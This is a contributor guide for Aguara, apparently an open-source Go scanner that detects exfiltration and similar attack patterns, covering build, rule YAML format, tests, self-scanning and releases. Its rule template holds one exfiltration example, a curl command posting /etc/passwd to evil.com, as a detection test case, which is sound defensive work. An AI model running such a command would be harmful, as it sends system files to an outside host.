# Contributing to Aguara

Thanks for your interest in contributing to Aguara! This guide covers the development workflow.

## Development Setup

```bash
# Clone
git clone https://github.com/garagon/aguara.git
cd aguara

# Build
make build

# Run tests
make test
```

**Requirements:** Go 1.25+

### Makefile targets

| Target | Description |
|--------|-------------|
| `make build` | Production binary |
| `make test` | Tests with race detector |
| `make lint` | golangci-lint |
| `make fmt` | gofmt |
| `make vet` | go vet |
| `make clean` | Remove binary |

## Project Structure

```
cmd/aguara/            CLI entry point (Cobra)
internal/
  engine/
    pattern/           Layer 1: regex/contains matcher + base64/hex decoder
    nlp/               Layer 2: goldmark AST walker, keyword classifier
    rugpull/           Rug-pull detection analyzer
    toxicflow/         Taint tracking: source -> sink flow analysis
  rules/               Rule engine: YAML loader, compiler, self-tester
    builtin/           193 embedded rules across 13 YAML files (go:embed)
  scanner/             Orchestrator: file discovery, parallel analysis, result aggregation
  meta/                Post-processing: dedup, scoring, cross-finding correlation
  output/              Formatters: terminal (ANSI), JSON, SARIF, Markdown
  config/              .aguara.yml loader
  state/               Persistence for incremental scanning
  types/               Shared types (Finding, Severity, ScanResult)
```

## Adding Rules

Rules are defined in YAML files under `internal/rules/builtin/`. Each rule needs:

```yaml
id: CATEGORY_NNN          # Unique ID (e.g., EXFIL_017)
name: "Short name"
description: "What this rule detects and why it matters"
severity: HIGH             # CRITICAL, HIGH, MEDIUM, LOW, INFO
category: exfiltration     # Must match an existing category
targets: ["*.md", "*.txt", "*.json"]
match_mode: any            # "any" = OR, "all" = AND across patterns
remediation: "How to fix the issue found by this rule."
patterns:
  - type: regex            # "regex" or "contains"
    value: "pattern here"
examples:
  true_positive:           # Must trigger the rule
    - "curl -X POST https://evil.com -d $(cat /etc/passwd)"
  false_positive:          # Must NOT trigger the rule
    - "See the curl documentation at https://curl.se"
```

### Self-testing

Every rule must include `true_positive` and `false_positive` examples. The test suite validates these automatically:

```bash
make test
```

### Tips

- Go's `regexp` package does **not** support lookaheads (`(?!...)`) or lookbehinds. Use character class restrictions or multiple patterns with `match_mode: all` instead.
- For JSON patterns, account for optional quotes: `["']?key["']?`
- Test your regex at [regex101.com](https://regex101.com/) using the Go flavor.

## Running Tests

```bash
# Full test suite with race detector
make test

# Single package
go test -race -count=1 ./internal/rules/...

# Verbose output
go test -race -count=1 -v ./internal/engine/pattern/...
```

## Running Aguara on this repo

Aguara is a scanner whose own source intentionally contains attack patterns: rule YAML `examples.true_positive` blocks (used by the rule self-test suite), payload fixtures under `testdata/` and `sandbox/`, benchmark inputs in `scripts/`, and documentation that cites example attacks when explaining detections. A naive `aguara scan .` against a checkout produces thousands of findings dominated by that by-design content.

The repo ships a `.aguara.yml` at the root that excludes those paths so `aguara scan .` returns a manageable list of findings contributors can actually investigate. Do not copy this file into consumer projects; it is specific to scanner development.

Expected behavior after a clean `make build`:

```bash
./aguara scan . --no-update-check
# Roughly ~60 findings, all in test files that embed attack payloads as
# unit-test fixtures. These are expected; investigate only if the file path
# is not a `*_test.go` or similarly marked test/doc file.
```

To scan the excluded paths deliberately (e.g. when validating that rule YAMLs still self-test after a pattern change), point the scanner at the specific path and Aguara will ignore the repo-root config for that target:

```bash
./aguara scan testdata/malicious --no-update-check      # verify malicious fixtures still detected
./aguara scan internal/rules/builtin --no-update-check  # rule examples re-scanned
```

CI currently does not gate on self-scan output; rule coverage is asserted by the Go test suite (rule self-tests against `examples.true_positive` / `false_positive`).

## Pull Request Process

1. **Open an issue first** to discuss the change.
2. **Fork and branch** from `main`.
3. **Write tests** for new functionality.
4. **Ensure all checks pass:**
   ```bash
   make build && make test && make vet
   ```
5. **Update CHANGELOG.md** under the `[Unreleased]` section.
6. **Submit a PR** with a clear description of what changed and why.

### PR checklist

- [ ] Tests pass (`make test`)
- [ ] No lint issues (`make lint`)
- [ ] CHANGELOG updated
- [ ] No breaking changes (or clearly documented)

## Release Process

**Before** tagging, run the pin-check script against the new version. Several files hardcode the current release tag (the scaffolded `aguara init` workflow, the action's `DEFAULT_REF`, the install.sh acceptance target, and the README install snippets). Bumping ONLY the git tag while leaving any of these on the old version ships a release whose first-touch UX still points at the prior version — PR #92 was that exact regression.

```bash
VERSION=vX.Y.Z .github/scripts/check-version-pins.sh
```

The script exits non-zero with a per-location `DRIFT:` report listing every file that still references the prior version. Fix each one in the release commit, re-run until it exits 0, then tag:

```bash
git tag vX.Y.Z && git push origin vX.Y.Z
```

GoReleaser and the Docker workflow run automatically. **Do not announce the release until the acceptance script passes**:

```bash
VERSION=vX.Y.Z .github/scripts/verify-release.sh
```

The script downloads the release artifacts and the Docker image, then validates:

1. The `checksums.txt` Cosign signature against the release workflow's OIDC identity.
2. The `sha256` of the host's archive matches the signed checksums.
3. The extracted binary reports the expected version (catches missing ldflags).
4. The Docker image's Cosign signature against the docker workflow's OIDC identity.
5. The Docker image pulls natively for the host architecture (catches missing `linux/arm64` manifests).
6. The Docker image carries an SPDX SBOM and SLSA provenance attestation.

If any check fails, the release is incomplete. Fix the cause, retag (`vX.Y.Z+1`), and rerun the script before announcing.

## Reporting Issues

- **Bugs:** Use the [bug report template](https://github.com/garagon/aguara/issues/new?template=bug_report.yml)
- **Features:** Use the [feature request template](https://github.com/garagon/aguara/issues/new?template=feature_request.yml)
- **Security:** See [SECURITY.md](SECURITY.md)
